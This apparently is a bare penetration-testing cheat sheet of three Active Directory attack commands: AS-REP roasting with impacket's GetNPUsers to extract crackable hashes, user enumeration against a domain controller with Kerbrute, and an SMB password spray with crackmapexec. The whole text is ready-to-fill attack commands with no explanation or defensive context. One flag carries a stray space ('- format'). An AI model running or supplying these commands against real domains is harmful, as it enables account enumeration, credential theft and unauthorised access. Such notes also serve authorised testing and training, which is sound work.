
```
#AS-REP Roast
impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile <hashes.txt>

#Kerbrute
./kerbrute userenum -d <domain_name> --dc <dc-ip> <user-list> -t 100

#Password Spray
crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
```